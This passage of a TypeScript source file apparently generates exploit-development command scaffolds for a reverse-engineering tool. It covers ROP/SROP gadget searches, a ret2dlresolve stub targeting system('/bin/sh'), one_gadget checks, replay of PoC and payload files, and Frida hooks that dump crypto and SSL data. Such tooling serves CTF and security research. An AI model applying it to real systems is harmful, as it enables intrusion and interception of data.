    out = run(['ROPgadget', '--binary', BIN, '--only', 'syscall|int|pop|ret'])
else:
    out = run(['objdump', '-d', BIN])
for line in out.splitlines():
    low = line.lower()
    if 'syscall' in low or 'int 0x80' in low or 'sigreturn' in low:
        print('[pwn-srop-gadget] ' + line[:220])
try:
    from pwn import ELF, ROP, SigreturnFrame, Ret2dlresolvePayload, context
    context.log_level = 'error'
    elf = ELF(BIN, checksec=False)
    print('[pwn-srop] pwntools=true arch=' + str(elf.arch) + ' bits=' + str(elf.bits))
    print('[pwn-srop] scaffold=SigreturnFrame(kernel=arch); set rax/rdi/rsi/rdx/rip for mprotect/read/execve')
    print('[pwn-ret2dlresolve] scaffold=Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])')
except Exception as exc:
    print('[pwn-srop] pwntools=false reason=' + type(exc).__name__ + ':' + str(exc))
PY
chmod +x /tmp/repi-pwn-srop-dlresolve.py
python3 /tmp/repi-pwn-srop-dlresolve.py ${targetArg}`,
				"SROP syscall surface and ret2dlresolve payload scaffold with pwntools/objdump fallback",
			);
			add(
				"pwn-advanced-one-gadget-constraints",
				`LIBC=$(ldd ${targetArg} 2>/dev/null | awk '/libc.so/{print $(NF-1); exit}')
printf '[pwn-one-gadget] libc=%s\\n' "$LIBC"
if [ -n "$LIBC" ] && [ -e "$LIBC" ]; then sha256sum "$LIBC" | sed 's/^/[pwn-one-gadget] sha256 /'; fi
if [ -n "$LIBC" ] && command -v one_gadget >/dev/null 2>&1; then one_gadget --raw -l 1 "$LIBC" 2>/dev/null | tr ' ' '\\n' | sed 's/^/[pwn-one-gadget] candidate=/' | head -80; one_gadget "$LIBC" 2>/dev/null | sed -n '1,120p' | sed 's/^/[pwn-one-gadget-constraint] /'; else echo '[pwn-one-gadget] tool=missing constraints=check registers,stack,null-byte,envp,argv manually'; fi`,
				"one_gadget candidate and constraint review tied to resolved libc fingerprint",
			);
			add(
				"pwn-advanced-seccomp-sandbox-scaffold",
				`echo '[pwn-seccomp] target='${targetArg}
checksec --file=${targetArg} 2>/dev/null | sed 's/^/[pwn-seccomp-checksec] /' || true
strings -a ${targetArg} 2>/dev/null | grep -Ei 'seccomp|prctl|pledge|sandbox|filter|BPF|SECCOMP' | head -80 | sed 's/^/[pwn-seccomp-string] /' || true
if command -v seccomp-tools >/dev/null 2>&1; then seccomp-tools dump ${targetArg} 2>/dev/null | sed -n '1,160p' | sed 's/^/[pwn-seccomp-dump] /' || true; else echo '[pwn-seccomp] seccomp-tools=missing fallback=strace'; fi
if command -v strace >/dev/null 2>&1; then timeout 5 strace -f -e trace=prctl,seccomp,execve,openat,read,write ${targetArg} </dev/null 2>&1 | sed -n '1,160p' | sed 's/^/[pwn-sandbox-strace] /' || true; fi`,
				"seccomp/sandbox syscall filter triage with seccomp-tools and strace fallback",
			);
		}

		if (wantsExploitReliability) {
			specialists.push("exploit reliability/autopwn");
			add(
				"exploit-poc-discovery",
				"find . -maxdepth 6 -type f \\( -iname '*exploit*' -o -iname '*poc*' -o -iname '*payload*' -o -iname '*replay*' -o -iname '*.http' -o -iname '*.har' -o -iname '*.py' -o -iname '*.sh' \\) -print 2>/dev/null | head -240 | sed 's/^/[exploit-candidate] file=/'",
				"candidate PoC/payload/replay artifacts from workspace",
			);
			add(
				"exploit-poc-normalizer-scaffold",
				`cat > /tmp/repi-exploit-normalize.py <<'PY'
#!/usr/bin/env python3
import hashlib, json, pathlib, re, stat
root = pathlib.Path(${targetPython})
if not root.exists() or root.is_file():
    root = pathlib.Path('.')
rx = re.compile(r'(exploit|poc|payload|replay|solve|attack)', re.I)
items = []
for path in root.rglob('*'):
    if not path.is_file() or path.stat().st_size > 2_000_000:
        continue
    if any(part in {'.git','node_modules','dist','build','coverage'} for part in path.parts):
        continue
    if not (rx.search(path.name) or path.suffix.lower() in {'.http','.har'}):
        continue
    data = path.read_bytes()
    head = data[:60000].decode('utf-8', 'ignore')
    kind = 'script'
    if 'pwntools' in head or 'from pwn' in head: kind = 'pwn-pwntools'
    elif 'curl ' in head or path.suffix == '.http': kind = 'http-replay'
    elif 'fetch(' in head or 'axios' in head: kind = 'js-http-replay'
    elif path.suffix == '.har': kind = 'har-artifact'
    executable = bool(path.stat().st_mode & stat.S_IXUSR)
    sha = hashlib.sha256(data).hexdigest()
    item = {'path': str(path), 'bytes': len(data), 'sha256': sha, 'kind': kind, 'executable': executable}
    items.append(item)
    print('[exploit-poc]', 'file=' + str(path), 'kind=' + kind, 'bytes=' + str(len(data)), 'sha256=' + sha[:16], 'executable=' + str(executable).lower())
out = pathlib.Path('/tmp/repi-exploit-candidates.json')
out.write_text(json.dumps(items, indent=2), 'utf-8')
print('[exploit-poc-summary]', 'candidates=' + str(len(items)), 'artifact=' + str(out))
PY
chmod +x /tmp/repi-exploit-normalize.py
python3 /tmp/repi-exploit-normalize.py ${targetArg}`,
				"normalize candidate PoC/payload/replay artifacts into typed inventory with hashes",
			);
			add(
				"exploit-replay-matrix-scaffold",
				`cat > /tmp/repi-exploit-replay-matrix.py <<'PY'
#!/usr/bin/env python3
import hashlib, json, os, shlex, subprocess, time
runs = int(os.getenv('REPI_REPLAY_RUNS', '5'))
timeout = float(os.getenv('REPI_REPLAY_TIMEOUT', '8'))
cmd_text = os.getenv('REPI_POC_CMD', '')
if not cmd_text:
    target = ${targetPython}
    cmd_text = 'python3 ' + shlex.quote(target) if target.endswith('.py') else shlex.quote(target)
cmd = shlex.split(cmd_text)
results = []
print('[exploit-replay]', 'cmd=' + cmd_text, 'runs=' + str(runs), 'timeout=' + str(timeout))
for i in range(1, runs + 1):
    start = time.time()
    try:
        proc = subprocess.run(cmd, input=os.getenv('REPI_POC_STDIN', '').encode(), stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=timeout)
        duration = time.time() - start
        blob = proc.stdout + b'\n---stderr---\n' + proc.stderr
        h = hashlib.sha256(blob).hexdigest()[:16]
        ok = proc.returncode == int(os.getenv('REPI_EXPECT_EXIT', '0'))
        rec = {'run': i, 'exit': proc.returncode, 'duration': round(duration, 3), 'hash': h, 'stdout_len': len(proc.stdout), 'stderr_len': len(proc.stderr), 'ok': ok}
        print('[exploit-replay]', 'run=' + str(i), 'exit=' + str(proc.returncode), 'duration=' + f'{duration:.3f}', 'hash=' + h, 'ok=' + str(ok).lower(), 'stdout_len=' + str(len(proc.stdout)), 'stderr_len=' + str(len(proc.stderr)))
    except subprocess.TimeoutExpired as exc:
        duration = time.time() - start
        rec = {'run': i, 'exit': 'timeout', 'duration': round(duration, 3), 'hash': 'timeout', 'stdout_len': len(exc.stdout or b''), 'stderr_len': len(exc.stderr or b''), 'ok': False}
        print('[exploit-replay]', 'run=' + str(i), 'exit=timeout', 'duration=' + f'{duration:.3f}', 'hash=timeout', 'ok=false')
    except Exception as exc:
        duration = time.time() - start
        rec = {'run': i, 'exit': 'error', 'duration': round(duration, 3), 'hash': type(exc).__name__, 'stdout_len': 0, 'stderr_len': 0, 'ok': False, 'error': str(exc)}
        print('[exploit-replay]', 'run=' + str(i), 'exit=error', 'duration=' + f'{duration:.3f}', 'hash=' + type(exc).__name__, 'ok=false')
    results.append(rec)
oks = sum(1 for r in results if r.get('ok'))
unique_hashes = sorted({str(r.get('hash')) for r in results})
unique_exits = sorted({str(r.get('exit')) for r in results})
stable = oks == runs and len(unique_hashes) == 1 and len(unique_exits) == 1
out = '/tmp/repi-exploit-replay-matrix.json'
open(out, 'w').write(json.dumps({'cmd': cmd_text, 'runs': results, 'success_rate': oks / max(runs, 1), 'stable': stable}, indent=2))
print('[exploit-replay-summary]', 'runs=' + str(runs), 'ok=' + str(oks), 'success_rate=' + f'{oks / max(runs,1):.3f}', 'unique_hashes=' + str(len(unique_hashes)), 'unique_exits=' + str(len(unique_exits)), 'stable=' + str(stable).lower(), 'artifact=' + out)
PY
chmod +x /tmp/repi-exploit-replay-matrix.py
python3 /tmp/repi-exploit-replay-matrix.py`,
				"multi-run PoC replay matrix with exit/duration/output-hash stability metrics",
			);
			add(
				"exploit-environment-pin-scaffold",
				`python3 - <<'PY'
import hashlib, os, pathlib, platform, subprocess, sys
print('[exploit-env]', 'python=' + sys.version.split()[0], 'platform=' + platform.platform())
for cmd in [['uname','-a'], ['id'], ['pwd']]:
    try:
        out = subprocess.run(cmd, text=True, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, timeout=2).stdout.strip()
        print('[exploit-env]', 'cmd=' + ' '.join(cmd), 'out=' + out[:240])
    except Exception as exc:
        print('[exploit-env]', 'cmd=' + ' '.join(cmd), 'error=' + type(exc).__name__)
for p in ['/proc/sys/kernel/randomize_va_space', '/proc/version']:
    path = pathlib.Path(p)
    if path.exists(): print('[exploit-env]', p + '=' + path.read_text('utf-8','ignore').strip()[:240])
target = pathlib.Path(${targetPython})
if target.exists() and target.is_file():
    data = target.read_bytes()
    print('[exploit-env]', 'target=' + str(target), 'bytes=' + str(len(data)), 'sha256=' + hashlib.sha256(data).hexdigest())
    try:
        out = subprocess.run(['file', str(target)], text=True, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, timeout=3).stdout.strip()
        print('[exploit-env]', 'file=' + out[:300])
    except Exception: pass
PY`,
				"environment pinning for replay: platform, ASLR, target hash, file metadata",
			);
			add(
				"exploit-flake-triage-scaffold",
				`cat > /tmp/repi-exploit-flake-triage.py <<'PY'
#!/usr/bin/env python3
import json, pathlib, statistics
path = pathlib.Path('/tmp/repi-exploit-replay-matrix.json')
if not path.exists():
    print('[exploit-flake] replay_matrix_missing=/tmp/repi-exploit-replay-matrix.json')
    raise SystemExit(0)
obj = json.loads(path.read_text())
runs = obj.get('runs', [])
exits = [str(r.get('exit')) for r in runs]
hashes = [str(r.get('hash')) for r in runs]
durations = [float(r.get('duration') or 0) for r in runs]
failures = [r for r in runs if not r.get('ok')]
print('[exploit-flake]', 'runs=' + str(len(runs)), 'failures=' + str(len(failures)), 'unique_exits=' + str(len(set(exits))), 'unique_hashes=' + str(len(set(hashes))), 'stable=' + str(obj.get('stable')).lower())
if durations:
    print('[exploit-flake]', 'duration_min=' + f'{min(durations):.3f}', 'duration_max=' + f'{max(durations):.3f}', 'duration_mean=' + f'{statistics.mean(durations):.3f}')
if len(set(exits)) > 1: print('[exploit-flake-risk]', 'exit_variance=' + ','.join(sorted(set(exits))))
if len(set(hashes)) > 1: print('[exploit-flake-risk]', 'output_hash_variance=' + ','.join(sorted(set(hashes))[:10]))
for r in failures[:12]: print('[exploit-flake-failure]', 'run=' + str(r.get('run')), 'exit=' + str(r.get('exit')), 'hash=' + str(r.get('hash')), 'duration=' + str(r.get('duration')))
PY
chmod +x /tmp/repi-exploit-flake-triage.py
python3 /tmp/repi-exploit-flake-triage.py`,
				"classify replay instability: exit variance, output drift, timeouts, and failure buckets",
			);
			add(
				"exploit-artifact-bundle-scaffold",
				`python3 - <<'PY'
import hashlib, json, pathlib, time
roots = [pathlib.Path('/tmp')]
files = []
for root in roots:
    for path in root.glob('repi-exploit*'):
        if path.is_file():
            data = path.read_bytes()
            files.append({'path': str(path), 'bytes': len(data), 'sha256': hashlib.sha256(data).hexdigest()})
manifest = {'created': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()), 'target': ${targetPython}, 'artifacts': files}
out = pathlib.Path('/tmp/repi-exploit-bundle-manifest.json')
out.write_text(json.dumps(manifest, indent=2), 'utf-8')
print('[exploit-bundle]', 'manifest=' + str(out), 'artifacts=' + str(len(files)))
for item in files[:40]: print('[exploit-bundle-artifact]', 'path=' + item['path'], 'bytes=' + str(item['bytes']), 'sha256=' + item['sha256'][:16])
PY`,
				"bundle replay matrix, PoC inventory, env pins, and triage artifacts into manifest",
			);
		}
	}

	function appendFridaTrace(): void {
		if (wantsFridaTrace) {
			specialists.push("Frida/GDB trace");
			if (/mobile|android|apk|frida|jadx|apktool|adb|smali/.test(context)) {
				add(
					"frida-gdb-trace-mobile-environment",
					"adb devices; adb shell getprop ro.product.cpu.abi 2>/dev/null || true; frida-ps -Uai 2>/dev/null | head -160 || true",
					"Android device, ABI, and process/package runtime map",
				);
				add(
					"frida-gdb-trace-hook-template",
					`cat > /tmp/repi-frida-trace.js <<'JS'\nfunction dumpBytes(label, value) {\n  try { console.log(label, hexdump(value, { length: Math.min(64, value.byteLength || 64) })); } catch (e) { console.log(label, String(value)); }\n}\nJava.perform(function() {\n  console.log('[repi-frida] Java runtime ready');\n  for (const klass of ['javax.crypto.Mac', 'java.security.MessageDigest', 'javax.crypto.Cipher']) {\n    try {\n      const K = Java.use(klass);\n      if (K.doFinal) K.doFinal.overloads.forEach(o => { o.implementation = function() { console.log('[doFinal]', klass, arguments.length); const ret = o.apply(this, arguments); dumpBytes('[doFinal.ret]', ret); return ret; }; });\n      if (K.digest) K.digest.overloads.forEach(o => { o.implementation = function() { console.log('[digest]', klass, arguments.length); const ret = o.apply(this, arguments); dumpBytes('[digest.ret]', ret); return ret; }; });\n    } catch (e) {}\n  }\n});\nfor (const name of ['strcmp','strncmp','memcmp','SSL_write','SSL_read']) {\n  const p = Module.findExportByName(null, name);\n  if (p) Interceptor.attach(p, { onEnter(args) { console.log('[native]', name, args[0], args[1]); } });\n}\nJS\ncat /tmp/repi-frida-trace.js`,
					"Frida Java crypto/network and native comparison hook template",
				);
			}
			if (target) {
				add(
					"frida-gdb-trace-gdb-scaffold",
					`cat > /tmp/repi-gdb-trace.gdb <<'GDB'\nset pagination off\nset disassembly-flavor intel\nset follow-fork-mode child\nbreak strcmp\nbreak strncmp\nbreak memcmp\nbreak strstr\nrun\nbt\ninfo registers\nx/24gx $rsp\nquit\nGDB\nprintf 'run: gdb -q %s -x /tmp/repi-gdb-trace.gdb\\n' ${targetArg}`,
					"GDB comparison breakpoint trace scaffold for native/runtime proof",
				);
			}
		}
	}

	return {
		appendMobileAndNative,
		appendPwnAndExploit,
		appendFridaTrace,
	};
}

export type NativeSpecialistCommandProvider = ReturnType<typeof createNativeSpecialistCommandProvider>;
